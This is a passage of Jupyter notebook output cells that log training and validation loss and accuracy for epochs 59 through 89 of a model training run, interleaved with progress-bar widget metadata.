      "2024-01-31 12:44:36 | INFO | Epoch 59 | Train Loss: 0.4192 | Train Accuracy: 0.9139\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b89d09c8ced247de935e4a184abf916f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:44:38 | INFO | Validation Loss: 0.7516 | Validation Accuracy: 0.8292\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9036d0fb1c684c84bea72c5bdba9de99",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:44:56 | INFO | Epoch 60 | Train Loss: 0.4287 | Train Accuracy: 0.9125\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4cf16392fd9c48bd92100fcf05268257",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:44:58 | INFO | Validation Loss: 0.6844 | Validation Accuracy: 0.8437\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "39634e4d6bd2419683a1547a270ac1a7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:45:16 | INFO | Epoch 61 | Train Loss: 0.4312 | Train Accuracy: 0.9115\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "21e5cd9882634c29b156681dbb535633",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:45:18 | INFO | Validation Loss: 0.7012 | Validation Accuracy: 0.8332\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "52b8191912b543dcba5c1cae234aa692",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:45:36 | INFO | Epoch 62 | Train Loss: 0.4308 | Train Accuracy: 0.9110\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c060f846d4da457ab93a2c4c7f3f4a80",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:45:38 | INFO | Validation Loss: 0.7524 | Validation Accuracy: 0.8280\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f6a147c0fa0a4d2bb77cf6639fe0fe70",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:45:56 | INFO | Epoch 63 | Train Loss: 0.4126 | Train Accuracy: 0.9162\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7e08576b9c9943b19bc31882cc157077",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:45:58 | INFO | Validation Loss: 0.6313 | Validation Accuracy: 0.8557\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6cfb16b510434de5b3a5cf932d93183e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:46:16 | INFO | Epoch 64 | Train Loss: 0.4013 | Train Accuracy: 0.9180\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dd00d1960adc474d861fec7b39357cd6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:46:18 | INFO | Validation Loss: 0.7803 | Validation Accuracy: 0.8201\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0d82513ad6fe4a5c95e54b4290a895dc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:46:35 | INFO | Epoch 65 | Train Loss: 0.4267 | Train Accuracy: 0.9127\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a5c6edc01253445d8af0b1fb7dc96c87",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:46:37 | INFO | Validation Loss: 0.7216 | Validation Accuracy: 0.8421\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7bb0b5f83a9d466d8e4228fd949bdf52",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:46:55 | INFO | Epoch 66 | Train Loss: 0.4404 | Train Accuracy: 0.9098\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a292fb727b594819b62827675c22a1f1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:46:57 | INFO | Validation Loss: 0.7815 | Validation Accuracy: 0.8242\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d7d33fdc69d6458cababce0756ff4f32",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:47:13 | INFO | Epoch 67 | Train Loss: 0.4186 | Train Accuracy: 0.9143\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d9b5f891db054ddc8c181af6b237f5fe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:47:15 | INFO | Validation Loss: 0.7813 | Validation Accuracy: 0.8211\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "255d01e89fba4c309e3db2504ca8f59b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:47:40 | INFO | Epoch 68 | Train Loss: 0.4152 | Train Accuracy: 0.9159\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e2fc849072cf4afcac4ef9a9bf7a7035",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:47:42 | INFO | Validation Loss: 0.7135 | Validation Accuracy: 0.8386\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bfda7899027c45ce8b87846a6cb99ce6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:48:00 | INFO | Epoch 69 | Train Loss: 0.4168 | Train Accuracy: 0.9139\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "581754aaadb04134b650dd68fc4085e4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:48:02 | INFO | Validation Loss: 0.6966 | Validation Accuracy: 0.8421\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2fe68c09984c4c158c0c29a3c64a2705",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:48:21 | INFO | Epoch 70 | Train Loss: 0.4165 | Train Accuracy: 0.9145\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0caeba216a4046aca422716e1cf3f294",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:48:24 | INFO | Validation Loss: 0.8187 | Validation Accuracy: 0.8185\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d89c703fbb9f4b2dbe41fbaf08882be6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:48:44 | INFO | Epoch 71 | Train Loss: 0.4006 | Train Accuracy: 0.9179\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "021affa788074ff58b3f00ec57c24d03",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:48:47 | INFO | Validation Loss: 0.6746 | Validation Accuracy: 0.8475\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d36c9c2fd5774c48a390d30f70d25754",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:49:05 | INFO | Epoch 72 | Train Loss: 0.4164 | Train Accuracy: 0.9148\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8819a9bc4d58423da8575691b621078f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:49:06 | INFO | Validation Loss: 0.8939 | Validation Accuracy: 0.7999\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3d92f3234a4b476285f25675e8db94a2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:49:23 | INFO | Epoch 73 | Train Loss: 0.4100 | Train Accuracy: 0.9152\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b118712b54404d11b144d4b6e0b7371a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:49:25 | INFO | Validation Loss: 0.7796 | Validation Accuracy: 0.8312\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4cdd6f8a1ca244948eff9c7a0b78690f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:49:41 | INFO | Epoch 74 | Train Loss: 0.4299 | Train Accuracy: 0.9106\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4ebdfadff22e43fd9106b2465e8cbbd4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:49:44 | INFO | Validation Loss: 0.6713 | Validation Accuracy: 0.8477\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c0a9e8b7d34b4c119ccfc7b5e849e45d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:50:02 | INFO | Epoch 75 | Train Loss: 0.4005 | Train Accuracy: 0.9174\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b3be627d78d94819bed19ab01b6d120f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:50:04 | INFO | Validation Loss: 0.8144 | Validation Accuracy: 0.8173\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c7347eea19b24842abee5ad06c5077cb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:50:20 | INFO | Epoch 76 | Train Loss: 0.3961 | Train Accuracy: 0.9180\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4b63328dd554485dae48c2d2186ced96",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:50:22 | INFO | Validation Loss: 0.7923 | Validation Accuracy: 0.8362\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "de54546423a54ac6b6a4371a8790f944",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:50:38 | INFO | Epoch 77 | Train Loss: 0.3661 | Train Accuracy: 0.9238\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "73b09ad7ca5249efa9829b7683a85a8b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:50:40 | INFO | Validation Loss: 0.7991 | Validation Accuracy: 0.8377\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4f12af9651d74c40878e3b4ee11d9f7b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:50:56 | INFO | Epoch 78 | Train Loss: 0.3946 | Train Accuracy: 0.9183\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "beb1108b694f454c81198c021a7e87b1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:50:57 | INFO | Validation Loss: 0.7177 | Validation Accuracy: 0.8476\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "efc17a03cec54960bd1d3141788c16e7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:51:13 | INFO | Epoch 79 | Train Loss: 0.3881 | Train Accuracy: 0.9191\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8dc2a6cc138b459c8a44cf505b90591a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:51:14 | INFO | Validation Loss: 0.7772 | Validation Accuracy: 0.8376\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "94b2f521b8424adb8d797eac82e9a62f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:51:30 | INFO | Epoch 80 | Train Loss: 0.3900 | Train Accuracy: 0.9177\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "75363973af434dbb9c808a836efad817",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:51:32 | INFO | Validation Loss: 0.7578 | Validation Accuracy: 0.8450\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c1c2eb58e91345678d0a78378100825a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:51:49 | INFO | Epoch 81 | Train Loss: 0.3578 | Train Accuracy: 0.9257\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a8a04770fca5461b8b01964bf3025f2c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:51:51 | INFO | Validation Loss: 0.8212 | Validation Accuracy: 0.8295\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2d22c8375e364a54b0b2c2a8b05f5351",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:52:07 | INFO | Epoch 82 | Train Loss: 0.3889 | Train Accuracy: 0.9186\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a29420553db34786822512dab1d8dc93",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:52:09 | INFO | Validation Loss: 0.7698 | Validation Accuracy: 0.8369\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "be1e844d7fab4924bf61b2a5a9d49545",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:52:26 | INFO | Epoch 83 | Train Loss: 0.3805 | Train Accuracy: 0.9200\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0171cbf4059c408a80681b321143f742",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:52:28 | INFO | Validation Loss: 0.8111 | Validation Accuracy: 0.8410\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4e1ead1166c14b0ab149b0b9db125e21",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:52:44 | INFO | Epoch 84 | Train Loss: 0.3626 | Train Accuracy: 0.9243\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0e0ef1c7e9a649b2b31a6d3d7511db85",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:52:46 | INFO | Validation Loss: 0.8777 | Validation Accuracy: 0.8275\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a01236058d9b425498d428a70b878362",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:53:02 | INFO | Epoch 85 | Train Loss: 0.3529 | Train Accuracy: 0.9269\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d0edb7462dd141e28e4fbab674c0aaef",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:53:04 | INFO | Validation Loss: 0.8416 | Validation Accuracy: 0.8174\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "664f334eab4244689ed7185a6ffc69fa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:53:20 | INFO | Epoch 86 | Train Loss: 0.3530 | Train Accuracy: 0.9258\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0e44588b833147dfaa76237a8fc9f108",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:53:22 | INFO | Validation Loss: 0.7793 | Validation Accuracy: 0.8467\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3b5afaeaa2aa48aa8cbb0badb5c437f1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:53:38 | INFO | Epoch 87 | Train Loss: 0.3646 | Train Accuracy: 0.9240\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bc86493f218f4b1b95c4fd29facc33a7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:53:39 | INFO | Validation Loss: 0.9330 | Validation Accuracy: 0.8104\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "edaf6afcbf884ff39999fa06a60e2edb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:53:56 | INFO | Epoch 88 | Train Loss: 0.3453 | Train Accuracy: 0.9280\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bd2ed2b5d0034e46afd78af2f8c0b956",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:53:58 | INFO | Validation Loss: 0.8237 | Validation Accuracy: 0.8412\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0999f8df0ad944dcb58a1ca73ecf1c8e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:54:14 | INFO | Epoch 89 | Train Loss: 0.3504 | Train Accuracy: 0.9270\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "edf6fb9e6c4942aab9d53043ddf79e28",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
